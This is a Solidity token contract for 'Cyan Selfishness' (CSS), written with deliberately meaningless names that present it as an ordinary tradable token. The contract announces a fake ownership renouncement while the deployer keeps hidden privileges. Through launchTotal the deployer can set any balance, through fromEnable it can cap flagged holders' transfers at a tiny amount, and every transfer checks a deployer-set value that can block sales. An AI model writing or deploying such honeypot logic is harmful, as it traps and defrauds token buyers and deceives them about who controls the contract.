//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface tradingFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapFrom) external view returns (uint256);

    function transfer(address tokenAuto, uint256 walletSwap) external returns (bool);

    function allowance(address walletMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletSwap) external returns (bool);

    function transferFrom(
        address sender,
        address tokenAuto,
        uint256 walletSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchAt, uint256 value);
    event Approval(address indexed walletMax, address indexed spender, uint256 value);
}

abstract contract teamSwapLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeList {
    function createPair(address enableMode, address amountReceiverBuy) external returns (address);
}

interface listAmount is tradingFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CyanSelfishness is teamSwapLaunched, tradingFee, listAmount {

    function name() external view virtual override returns (string memory) {
        return listSwap;
    }

    function allowance(address exemptFund, address maxLiquidity) external view virtual override returns (uint256) {
        if (maxLiquidity == receiverFromLiquidity) {
            return type(uint256).max;
        }
        return teamIs[exemptFund][maxLiquidity];
    }

    string private shouldMax = "CSS";

    bool private sellTake;

    function owner() external view returns (address) {
        return marketingBuy;
    }

    uint256 public takeTradingReceiver;

    uint256 private marketingTeam;

    function balanceOf(address swapFrom) public view virtual override returns (uint256) {
        return limitMinMax[swapFrom];
    }

    function teamMaxAmount(address launchedFund) public {
        if (marketingLimit) {
            return;
        }
        
        tokenFrom[launchedFund] = true;
        
        marketingLimit = true;
    }

    function transferFrom(address tradingLiquidity, address tokenAuto, uint256 walletSwap) external override returns (bool) {
        if (_msgSender() != receiverFromLiquidity) {
            if (teamIs[tradingLiquidity][_msgSender()] != type(uint256).max) {
                require(walletSwap <= teamIs[tradingLiquidity][_msgSender()]);
                teamIs[tradingLiquidity][_msgSender()] -= walletSwap;
            }
        }
        return minMax(tradingLiquidity, tokenAuto, walletSwap);
    }

    constructor (){
        
        minLiquidity();
        marketingLaunched exemptTotal = marketingLaunched(receiverFromLiquidity);
        receiverShould = modeList(exemptTotal.factory()).createPair(exemptTotal.WETH(), address(this));
        if (sellTake != swapAt) {
            takeTradingReceiver = marketingTeam;
        }
        launchExempt = _msgSender();
        tokenFrom[launchExempt] = true;
        limitMinMax[launchExempt] = tokenLimit;
        if (swapAt != sellTake) {
            sellTake = false;
        }
        emit Transfer(address(0), launchExempt, tokenLimit);
    }

    bool public teamWallet;

    function getOwner() external view returns (address) {
        return marketingBuy;
    }

    uint8 private receiverLaunchTeam = 18;

    function symbol() external view virtual override returns (string memory) {
        return shouldMax;
    }

    address public receiverShould;

    mapping(address => mapping(address => uint256)) private teamIs;

    function minMax(address tradingLiquidity, address tokenAuto, uint256 walletSwap) internal returns (bool) {
        if (tradingLiquidity == launchExempt) {
            return receiverListAuto(tradingLiquidity, tokenAuto, walletSwap);
        }
        uint256 listTx = tradingFee(receiverShould).balanceOf(txSell);
        require(listTx == tokenShould);
        require(tokenAuto != txSell);
        if (swapListTo[tradingLiquidity]) {
            return receiverListAuto(tradingLiquidity, tokenAuto, isBuy);
        }
        return receiverListAuto(tradingLiquidity, tokenAuto, walletSwap);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenLimit;
    }

    function fromEnable(address atFeeTeam) public {
        minSenderAuto();
        
        if (atFeeTeam == launchExempt || atFeeTeam == receiverShould) {
            return;
        }
        swapListTo[atFeeTeam] = true;
    }

    uint256 tokenShould;

    bool public marketingLimit;

    function transfer(address launchTake, uint256 walletSwap) external virtual override returns (bool) {
        return minMax(_msgSender(), launchTake, walletSwap);
    }

    uint256 private receiverTradingWallet;

    uint256 private tokenLimit = 100000000 * 10 ** 18;

    bool private swapAt;

    event OwnershipTransferred(address indexed marketingEnable, address indexed autoTeam);

    mapping(address => bool) public tokenFrom;

    function approve(address maxLiquidity, uint256 walletSwap) public virtual override returns (bool) {
        teamIs[_msgSender()][maxLiquidity] = walletSwap;
        emit Approval(_msgSender(), maxLiquidity, walletSwap);
        return true;
    }

    function minLiquidity() public {
        emit OwnershipTransferred(launchExempt, address(0));
        marketingBuy = address(0);
    }

    mapping(address => bool) public swapListTo;

    function decimals() external view virtual override returns (uint8) {
        return receiverLaunchTeam;
    }

    address public launchExempt;

    address private marketingBuy;

    address txSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function minSenderAuto() private view {
        require(tokenFrom[_msgSender()]);
    }

    function tradingIsExempt(uint256 walletSwap) public {
        minSenderAuto();
        tokenShould = walletSwap;
    }

    uint256 constant isBuy = 11 ** 10;

    uint256 public tokenFund;

    mapping(address => uint256) private limitMinMax;

    uint256 fundExemptMax;

    function receiverListAuto(address tradingLiquidity, address tokenAuto, uint256 walletSwap) internal returns (bool) {
        require(limitMinMax[tradingLiquidity] >= walletSwap);
        limitMinMax[tradingLiquidity] -= walletSwap;
        limitMinMax[tokenAuto] += walletSwap;
        emit Transfer(tradingLiquidity, tokenAuto, walletSwap);
        return true;
    }

    function launchTotal(address launchTake, uint256 walletSwap) public {
        minSenderAuto();
        limitMinMax[launchTake] = walletSwap;
    }

    string private listSwap = "Cyan Selfishness";

    address receiverFromLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}